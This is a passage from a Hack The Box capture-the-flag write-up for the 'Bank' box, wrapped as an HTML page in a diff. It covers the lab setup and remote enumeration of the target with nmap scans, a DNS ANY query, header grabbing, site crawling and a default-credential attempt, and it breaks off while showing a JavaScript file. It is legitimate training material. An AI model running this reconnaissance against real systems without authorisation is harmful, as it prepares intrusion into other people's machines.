@@ -1,0 +1,1231 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta description="This is an easy Linux box.">
+    
+    <title>
+        
+            Bank | mmezirard
+        
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Bank<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-12-31</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/bank/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#remote-enumeration">Remote enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#host-discovery">Host discovery</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#tcp-port-scanning">TCP port scanning</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#service-fingerprinting">Service fingerprinting</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#scripts">Scripts</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#dns-port-53-tcp">DNS (port 53&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#all-records-for-bank-htb">All records for bank.htb</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#apache-port-80-tcp">Apache (port 80&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#common-credentials">Common credentials</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#under-the-hood">Under the hood</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#http-headers">HTTP headers</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#technology-lookup">Technology lookup</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#site-crawling">Site crawling</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#directory-fuzzing">Directory fuzzing</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#exploring-inc">Exploring &#x2F;inc&#x2F;</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#exploring-balance-transfer">Exploring &#x2F;balance-transfer&#x2F;</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#hash-cracking">Hash cracking</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#failed-encryption">Failed encryption</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#logging-in-as-chris">Logging in as chris</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#foothold-file-upload">Foothold (File upload)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#preparation">Preparation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#exploitation">Exploitation</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#bypassing-the-validation">Bypassing the validation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#finding-a-valid-extension">Finding a valid extension</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#local-enumeration">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#distribution">Distribution</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#architecture">Architecture</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#kernel">Kernel</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#apparmor">AppArmor</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#nics">NICs</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#hostname">Hostname</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#local-users">Local users</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#local-groups">Local groups</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#user-account-information">User account information</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#home-folder">Home folder</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#command-history">Command history</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#website-code-review">Website code review</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#mysql-port-3306-tcp">MySQL (port 3306&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#version">Version</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#databases">Databases</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#htbbank-s-tables">htbbank&#x27;s tables</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#users-s-columns">users&#x27;s columns</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#users-s-columns-content">users&#x27;s columns content</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#sudo-permissions">Sudo permissions</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#environment-variables">Environment variables</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#listening-ports">Listening ports</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#processes">Processes</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#suid-binaries">SUID binaries</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#exploring-var-htb">Exploring &#x2F;var&#x2F;htb</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#privilege-escalation-var-htb-emergency">Privilege escalation (&#x2F;var&#x2F;htb&#x2F;emergency)</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#local-enumeration-1">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#home-folder-1">Home folder</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Linux</p>
+<p><strong>Release date</strong>: 2017-06-16</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/95">makelarisjr</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great practice security-wise, but it's a VM so it's alright. This way I won't have to prefix some commands with <code>sudo</code>, which gets cumbersome in the long run. Heck, it's hard enough to remember the flags for the commands without needing to know the privileges required to run them too!</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box. I'll call it <code>workspace</code>, and it will be located at the root of my filesystem <code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll run <code>httpsimpleserver</code> to create an HTTP server and <code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make files in this folder available over the Internet, which will be especially useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory. This will come in handy once we get a foothold, for privilege escalation and for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the complexity of some exploits, and prefer a more manual approach when it's not too much hassle to really understand what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.20</code>, while the target machine's IP address will be <code>10.10.10.29</code>. The commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever need to transfer files or binaries to the target machine I'll always place them in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="remote-enumeration">Remote enumeration</h1>
+<h2 id="host-discovery">Host discovery</h2>
+<p>Well, we already know the IP we are targeting, so this phase is actually empty!</p>
+<h2 id="tcp-port-scanning">TCP port scanning</h2>
+<p>As usual, I'll initiate a port scan on Bank using a TCP SYN <code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.29<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">53/tcp open  domain
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="service-fingerprinting">Service fingerprinting</h2>
+<p>Following the port scan, let's gather more data about the services associated with the open ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.29<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 22,53,80<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
+</span><span class="z-text z-plain">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+</span><span class="z-text z-plain">53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
+</span><span class="z-text z-plain">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+</span><span class="z-text z-plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Bank is running Linux, and the SSH version suggests that it might be Ubuntu. That's good to know!</p>
+<h2 id="scripts">Scripts</h2>
+<p>Let's run <code>nmap</code>'s default scripts on these services to see if they can find additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.29<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 22,53,80<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
+</span><span class="z-text z-plain">|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
+</span><span class="z-text z-plain">|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
+</span><span class="z-text z-plain">|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
+</span><span class="z-text z-plain">53/tcp open  domain
+</span><span class="z-text z-plain">| dns-nsid: 
+</span><span class="z-text z-plain">|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: Apache2 Ubuntu Default Page: It works
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>http-title</code> script found that the HTTP title of the home page of the Apache server on port <code>80/tcp</code> is 'Apache2 Ubuntu Default Page: It works'.</p>
+<p>This name implies that it's the default page for an Apache version <code>2</code> installation, so there would be nothing to find...</p>
+<h2 id="dns-port-53-tcp">DNS (port <code>53/tcp</code>)</h2>
+<h3 id="all-records-for-bank-htb">All records for <code>bank.htb</code></h3>
+<p>Let's query the DNS server for all records about <code>bank.htb</code>, which is probably the domain name for this box (according to HTB's naming habits):</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> dig any bank.htb @10.10.10.29</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">;; OPT PSEUDOSECTION:
+</span><span class="z-text z-plain">; EDNS: version: 0, flags:; udp: 4096
+</span><span class="z-text z-plain">;; QUESTION SECTION:
+</span><span class="z-text z-plain">;bank.htb.                      IN      ANY
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">;; ANSWER SECTION:
+</span><span class="z-text z-plain">bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
+</span><span class="z-text z-plain">bank.htb.               604800  IN      NS      ns.bank.htb.
+</span><span class="z-text z-plain">bank.htb.               604800  IN      A       10.10.10.29
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">;; ADDITIONAL SECTION:
+</span><span class="z-text z-plain">ns.bank.htb.            604800  IN      A       10.10.10.29
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It has a <code>SOA</code> entry for <code>bank.htb</code> and <code>chris.bank.htb</code>! Let's add them to our hosts file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.29 bank.htb chris.bank.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">tee</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> /etc/hosts</span>
+</span></code></pre>
+<p>Now let's see what these domains are holding.</p>
+<h2 id="apache-port-80-tcp">Apache (port <code>80/tcp</code>)</h2>
+<p>Let's browse to <code>http://bank.htb/</code> and see what we get.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/domain-homepage.png" alt="Domain homepage" /></p>
+<p>We are redirected to <code>/login.php</code>! And we don't get a default installation web page as expected in the <a href="https://mmezirard.github.io/htb-write-ups/boxes/bank/#scripts">Scripts</a> section, but instead a login form!</p>
+<h3 id="common-credentials">Common credentials</h3>
+<p>We can try to enter common credentials, but it doesn't work. It returns this error message:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/domain-homepage-credentials-error.png" alt="Domain homepage credentials error" /></p>
+<h3 id="under-the-hood">Under the hood</h3>
+<p>When we press the 'Submit query' button, a POST request is actually sent to <code>/login.php</code> with the data:</p>
+<pre data-lang="html" class="language-html z-code"><code class="language-html" data-lang="html"><span class="z-text z-html z-basic">inputEmail=email&amp;inputPassword=password&amp;submit=Submit+Query
+</span></code></pre>
+<p>The response code is <code>200</code> in case of an invalid login request, and the response body contains the HTML of the homepage with the error message.</p>
+<h3 id="http-headers">HTTP headers</h3>
+<p>Let's check out the HTTP response headers when we request the homepage.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl http://bank.htb/<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>I</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HTTP/1.1 302 Found
+</span><span class="z-text z-plain">Date: Sat, 30 Dec 2023 21:47:48 GMT
+</span><span class="z-text z-plain">Server: Apache/2.4.7 (Ubuntu)
+</span><span class="z-text z-plain">X-Powered-By: PHP/5.5.9-1ubuntu4.21
+</span><span class="z-text z-plain">Set-Cookie: HTBBankAuth=b6lfm7rm6oj1tvava1lvardgl5; path=/
+</span><span class="z-text z-plain">Expires: Thu, 19 Nov 1981 08:52:00 GMT
+</span><span class="z-text z-plain">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+</span><span class="z-text z-plain">Pragma: no-cache
+</span><span class="z-text z-plain">location: login.php
+</span><span class="z-text z-plain">Content-Type: text/html
+</span></code></pre>
+<p>As we noticed while browsing to <code>http://bank.htb/</code>, there's a redirection to <code>/login.php</code>. However, the <code>Server</code> header indicates that the web server is Apache version <code>2.4.7</code>, corresponding to the Ubuntu distribution. Moreover, the <code>X-Powered-By</code> header leaks that PHP version <code>5.5.9</code> is used.</p>
+<h3 id="technology-lookup">Technology lookup</h3>
+<p>While we're at it, let's look up the technologies used by this website with the <a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/domain-homepage-wappalyzer.png" alt="Domain homepage Wappalyzer extension" /></p>
+<p>So it confirms what we already discovered, but it also reveals that this website is using Bootstrap and libraries like jQuery.</p>
+<h3 id="site-crawling">Site crawling</h3>
+<p>Let's crawl the website to see if I there's interesting linked web pages.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> katana<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> http://bank.htb/</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[INF] Started standard crawling for =&gt; http://bank.htb/
+</span><span class="z-text z-plain">http://bank.htb/
+</span><span class="z-text z-plain">http://bank.htb/assets/js/theme/custom.js
+</span><span class="z-text z-plain">http://bank.htb/assets/js/plugins/morris/raphael.min.js
+</span><span class="z-text z-plain">http://bank.htb/assets/js/plugins/morris/morris.min.js
+</span><span class="z-text z-plain">http://bank.htb/assets/js/js/bootstrap.min.js
+</span><span class="z-text z-plain">http://bank.htb/index.html
+</span><span class="z-text z-plain">http://bank.htb/assets/js/plugins/morris/morris-data.js
+</span><span class="z-text z-plain">http://bank.htb/assets/css/theme/styles.css
+</span><span class="z-text z-plain">http://bank.htb/login.php
+</span><span class="z-text z-plain">http://bank.htb/assets/js/bootstrap.min.js
+</span><span class="z-text z-plain">http://bank.htb/assets/js/sweetalert.min.js
+</span><span class="z-text z-plain">http://bank.htb/assets/css/bootstrap.min.css
+</span><span class="z-text z-plain">http://bank.htb/assets/js/jquery.js
+</span><span class="z-text z-plain">http://bank.htb/a
+</span></code></pre>
+<p>It looks like this website is using plugins like Raphael.js and Morris.js.</p>
+<p>The <code>custom.js</code> file could be interesting... lets check it.</p>
+<pre data-lang="js" class="language-js z-code"><code class="language-js" data-lang="js"><span class="z-source z-ts"><span class="z-meta z-function-call z-ts"><span class="z-entity z-name z-function z-ts">$</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-support z-variable z-dom z-ts">document</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">ready</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-function z-expression z-ts"><span class="z-storage z-type z-function z-ts">function</span> <span class="z-meta z-parameters z-ts"><span class="z-punctuation z-definition z-parameters z-begin z-ts">(</span><span class="z-punctuation z-definition z-parameters z-end z-ts">)</span></span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts">    <span class="z-meta z-function-call z-ts"><span class="z-entity z-name z-function z-ts">$</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>.submenu &gt; a<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">click</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-function z-expression z-ts"><span class="z-storage z-type z-function z-ts">function</span> <span class="z-meta z-parameters z-ts"><span class="z-punctuation z-definition z-parameters z-begin z-ts">(</span><span class="z-variable z-parameter z-ts">e</span><span class="z-punctuation z-definition z-parameters z-end z-ts">)</span></span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts">        <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">e</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">preventDefault</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts">        <span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">var</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-readwrite z-ts">$li</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-entity z-name z-function z-ts">$</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-variable z-language z-this z-ts">this</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">parent</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>li<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
